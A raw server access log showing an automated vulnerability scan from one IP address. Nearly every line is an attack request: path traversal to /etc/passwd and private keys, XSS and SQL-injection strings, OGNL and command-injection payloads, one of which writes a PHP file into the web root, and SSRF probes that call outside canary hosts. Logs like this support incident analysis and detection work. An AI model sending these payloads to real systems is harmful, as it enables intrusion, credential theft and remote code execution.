2026-02-20 15:59:25,364 [INFO] 目标地址  : https://dashscope.aliyuncs.com/compatible-mode/v1
INFO:     3.211.106.148:51876 - "GET /install.sql HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /gradle/libs.versions.toml HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;/root/kerbynet.cgi/scripts/getkey%20../../../etc/passwd;%22 HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "POST /phpmailer/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /api/api-docs/swagger.json HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET //example.com/../ HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /toolbox-resource/../serverconfig.xml HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /?instawp-database-manager=/../../../%2e%2fmigrate%2ftemplates%2fdebug%2fdb-table&table_name=wp_users--%20- HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /.sh_history HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /wp-content/ldap-authentication-report.csv HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /?up=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-up%27%29%3E&body=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-body%27%29%3E&return=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-return%27%29%3E&end=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-end%27%29%3E&n=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-n%27%29%3E&opt=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-opt%27%29%3E&source=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-source%27%29%3E&y=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-y%27%29%3E&parent=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-parent%27%29%3E&reason=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reason%27%29%3E&meta=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-meta%27%29%3E&pass1=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-pass1%27%29%3E&blog=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-blog%27%29%3E&plugin=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-plugin%27%29%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /?num=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-num%27%29%3E&drop=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-drop%27%29%3E&g-recaptcha-response=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-g-recaptcha-response%27%29%3E&field_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-field_id%27%29%3E&user_email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-user_email%27%29%3E&alias=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-alias%27%29%3E&ref=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-ref%27%29%3E&save=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-save%27%29%3E&enabled=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-enabled%27%29%3E&year=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-year%27%29%3E&checked=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-checked%27%29%3E&post_ID=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_ID%27%29%3E&files=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-files%27%29%3E&text-color=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-text-color%27%29%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /webjars/swagger-ui/3.6.1/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /vmos/heapdump HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /webjars/swagger-ui/2.1.4/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/flags HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /application/configs/routes.ini HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "POST /api/console/proxy?path=_search?size=1&method=POST HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/api-docs/swagger.json HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /eam/vib?id=C:\\Documents%20and%20Settings\\All%20Users\\Application%20Data\\VMware\\VMware%20VirtualCenter\\vcdb.properties HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /key.pem HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /riot-core-services/attachment/download?file=hec0Q19v8sz7NcWnpV3BFSwwgM0dCsRAXLH%2bZzenA%2bk%3d HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /.env.dev HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1 HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /iam/login HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /cf-scripts/scripts/ajax/package/cfajax.js HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /json/reply/RequestLogs HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /get_rdf?comp=sdcust&locale_code=en-us HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /manage/actuator/heapdump HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET / HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /wp-config.bak HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "POST /api/console/proxy?path=_search?size=1&method=POST HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /log/firewall.log HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /plugins/servlet/oauth/consumer-info/zzz HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /bin/querybuilder.feed/graphql/execute/json/x HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /webjars/swagger-ui/2.2.6/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "POST /mobile/graphql HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /wp-content/plugins/easy-wp-smtp/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /api/v1/swagger.json HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "POST /shopify/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /irj/forwardsap.jsp?cmd=ls HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /vizql/sessions/session123-456%3A789/eps/main/?url=http://example.com&connectorClass=aaaaa HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /webjars/swagger-ui/3.19.5/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /webjars/swagger-ui/3.36.2/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /wp-admin/admin-ajax.php?action=aux_the_recent_products&data[wp_query_args][post_type]=post&data[title]=%3Cscript%3Etest()%3C/script%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /security.yml HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /storage/logs/laravel.log HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /logs HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /does-not-exist-page-a6e4e3bb?a+--env=dev HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /concrete/libraries/3rdparty/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(document.domain)> HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "POST /druid/indexer/v1/sampler HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /webjars/swagger-ui/3.2.0/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/v1/swagger.json HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /api/swagger/static/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /setup/setup-s/%25u002e%25u002e/%25u002e%25u002e/plugin-admin.jsp HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "POST /mifs/j_spring_security_check HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /wp-admin/admin-ajax.php?action=dprv_log_event&message=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /wp-config.php3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /badging/badge_template_v0.php?layout=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /js/../../../../../../../../etc/passwd%00.jpg HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /wp-json/wc/store/products/collection-data?calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252c%252522sqli-test%252522%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500 HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /api/experimental/latest_runs HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /cgi-bin/multimon.cgi HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /manage/log/view?filename=passwd&base=..%2f..%2f..%2f..%2fetc HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /login.action HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/swagger/static/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /api/asyncapi.yaml HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /proxy%3Ahttps%3A//ssrfcanary.com/%3Findex.0.css HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "POST /rest/default/V1/guest-carts/test-id/estimate-shipping-methods HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /share/api/notes/%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /CFIDE/administrator/datasources/index.cfm?locale=../../../../../../../lib/password.properties%00en HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /%28S%28x%29%29/b/%28S%28x%29%29in/Ninject.dll HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "POST /CFIDE/wizards/common/utils.cfc?method=wizardHash%20inPassword=bar%20_cfclient=true HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /admin/actuator/heapdump HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/experimental/latest_runs HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "POST /s2/upload.action HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /webjars/swagger-ui/4.4.1/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /-/avatar/%3Fd%3D1.bp.blogspot.com%252fme.jpg%25252f..%25252f..%25252fssrfcanary.com HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /?option=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-option%27%29%3E&server=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-server%27%29%3E&admin=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-admin%27%29%3E&create=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-create%27%29%3E&template=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-template%27%29%3E&number=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-number%27%29%3E&lastname=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-lastname%27%29%3E&multi_number=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-multi_number%27%29%3E&size=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-size%27%29%3E&tax=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-tax%27%29%3E&sql=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-sql%27%29%3E&show_sticky=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-show_sticky%27%29%3E&attachments=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-attachments%27%29%3E&_method=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-_method%27%29%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "POST /sso/acs HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/asyncapi.yaml HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /bonita/portal/themeResource?theme=portal/../../../../../../../../../../../../../../../../&location=etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /proxy/https/example.com HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /webservice/getsystemtree.ashx?userid=&DelphiGuid=<!%5BCDATA%5B<img%20src=x%20onerror=alert(1);>%5D%5D>&IsLogin=False HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "POST /rest/hipchat/integration/latest/installation/begin HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /App_Plugins/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /webjars/swagger-ui/4.4.1-1/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /webjars/swagger-ui/3.47.1/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /webeditor/../../../windows/win.ini HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "POST /aspera/faspex/package_relay/relay_access HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /admin/sidekiq/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /v2/jolokia/version HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "POST /wp-content/wp-plugins/turtle-ad-network/base58php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /monitoring/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /reminder.sh HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /v2/_catalog HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /bin/wcm/search/gql.json/a.1.json/graphql/execute/json/x?query=type:base%20limit:..1&pathPrefix= HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /api/cors/data%3Atext/html%3Bbase64%2CPHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ%2B%23 HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /wp-admin/admin-ajax.php?action=cdaily&subaction=cd_calendar&id=XX"><script>alert(document.cookie)</script> HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /?q=....//....//etc/passwd&s=....//....//etc/passwd&search=....//....//etc/passwd&id=....//....//etc/passwd&action=....//....//etc/passwd&keyword=....//....//etc/passwd&query=....//....//etc/passwd&page=....//....//etc/passwd&keywords=....//....//etc/passwd&url=....//....//etc/passwd&view=....//....//etc/passwd&cat=....//....//etc/passwd&name=....//....//etc/passwd&key=....//....//etc/passwd&p=....//....//etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /api/application.wadl HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28"Hello%20from"%20%2B%20"%20search%20text%3A"%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20 HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /wp-admin/admin-ajax.php?action=likebtn_prx&likebtn_q=aHR0cHM6Ly9zc3JmY2FuYXJ5LmNvbQ== HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /atmail/index.php/admin/index/?error=1%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /phpmyadmin/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /nifi-api/controller/config HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /rails/info/routes HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "POST /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /auth/realms/master/clients-registrations/default/security-admin-console HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /riot-core-services/attachment/download?file=x4ZQnd%2biatqcwfFOVDMqOw%3d%3d HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /pma/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "POST /v1/statement HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /idm/v2/api-docs HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /Api.svc HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "POST /__admin/mappings HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /admin/elfinder/elfinder-cke.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /carbon/admin/login.jsp HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/application.wadl HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /uploads/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /scripts/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /web.config.bak HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /?u=ac29k HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /wp-admin/admin-ajax.php?action=cdaily&subaction=cd_dismisshint&callback=<script>alert(document.cookie)</script> HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/cors/data%3Atext/html%3Bbase64%2CPHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ%2B%23 HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /uploads/assets/backend/elfinder/elfinder-cke.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /actuator/trace HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "POST /gradio_api/run/input_data_fn HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /?InternalDir=/../../../../ProgramData/RhinoSoft/Serv-U/^&InternalFile=Serv-U-StartupLog.txt HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /api/%3Cimg%20src%3D%22%22%20onerror%3Dalert%28document.domain%29%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /wp-admin/admin-ajax.php?action=memberhero_send_form&_memberhero_hook=phpinfo HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /struts/utils.js HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /myaccount/javax.faces.resource./WEB-INF/web.xml.jsf?ln=.. HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /sphinx/sphinx.conf HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /ui/clusters/kafka-ui/brokers HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /PhoneBackup/3a6045b3ad6f0c4a853fe3f3bf844ef5.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /carbon/admin/login.jsp?msgId=%27;alert(document.domain)// HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /api/jolokia/read%3Csvg%20onload%3Dalert%28document.cookie%29%3E?mimeType=text/html HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "POST /api/push HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /?admin_email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-admin_email%27%29%3E&code=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-code%27%29%3E&dump=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-dump%27%29%3E&item=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-item%27%29%3E&timezone=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-timezone%27%29%3E&blog_public=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-blog_public%27%29%3E&add=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-add%27%29%3E&enable=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-enable%27%29%3E&customized=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-customized%27%29%3E&admin_password=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-admin_password%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-keywords%27%29%3E&timestamp=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-timestamp%27%29%3E&label=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-label%27%29%3E&g=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-g%27%29%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "POST /webui/logoutconfirm.html?menu=12 HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /webjars/swagger-ui/4.1.0/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /webjars/swagger-ui/3.2.2/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /phinx.yml HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /wiki/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /faces/javax.faces.resource/web.xml?loc=../WEB-INF HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /wiki/plugins/servlet/widgetconnector/placeholder?thumb=https://ssrfcanary.com&overlay=youtube&width=400&height=300 HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /wp-content/plugins/adminer/adminer.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "POST /grafana/login HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/%3Cimg%20src%3D%22%22%20onerror%3Dalert%28document.domain%29%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /swagger/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /pipeline/apis/v1beta1/runs?page_size=5&sort_by=created_at%20desc HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "POST /wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /ui/altair HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /irj/helper.jsp?cmd=cat%20C:%5CWindows%5Cwin.ini HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /service.pdfs/confluence?file=userguide&lang=x&pluginPath=$(echo+PD9waHAgZWNobyAiYW4gMTI0MTM0NTMzMjQyMjEiO30/Pg%3D%3D+|+base64+-d+>/var/www/shtml/an.php) HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /xd.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /resources/qmc/fonts/../../../qrs/ReloadTask?xrfkey=1333333333333337&filter=.ttf HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/jolokia/read%3Csvg%20onload%3Dalert%28document.cookie%29%3E?mimeType=text/html HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /docpicker/internal_proxy/http/127.0.0.1 HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "POST /api/push HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /vendor/dompdf/dompdf/src/Dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /darkstat/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /Tracking/ResourceStringUsageData.axd?s=\\39xfrurj4h7sj3pzqursub6xkub.39xfrxc9yts31s4ojofteedsm6y.canary.assetnotessrf.com\c$\a&Data=00000000-0000-0000-0000-000000000000 HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /webjars/swagger-ui/4.16.1/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /webjars/swagger-ui/3.31.1/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "PUT /v1/kv/b9a945c7caa82e3903976c1da971aaab HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /.ssh/id_rsa HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "POST /geoserver/wfs HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "POST /template/aui/text-inline.vm HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /application/heapdump HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /webjars/swagger-ui/4.8.0/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /administrator/env HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /servlet/~yer/bsh.servlet.BshServlet HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /esp/cms_changeDeviceContext.esp?device=aaaaa:a%27";user|s."1337"; HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /webjars/swagger-ui/3.26.1/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /webjars/swagger-ui/3.11.0/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /aaaaa HTTP/1.1" 200 OK
